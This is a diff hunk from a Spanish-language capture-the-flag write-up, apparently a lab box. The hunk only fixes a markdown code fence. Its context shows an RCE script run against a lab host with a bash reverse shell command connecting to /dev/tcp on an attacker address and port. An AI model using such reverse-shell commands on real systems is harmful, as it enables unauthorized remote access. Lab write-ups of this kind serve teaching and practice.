@@ -337,7 +337,7 @@ uid=1000(frank) gid=1000(frank) groups=1000(frank)
 
 Vamos a obtener una reverse shell con el siguiente comando:
 
-````bash
+```bash
 ❯ python3 rce.py -u http://10.129.228.213:8080 -c "bash -i >& /dev/tcp/10.10.15.143/8888 0>&1"
 ```
 
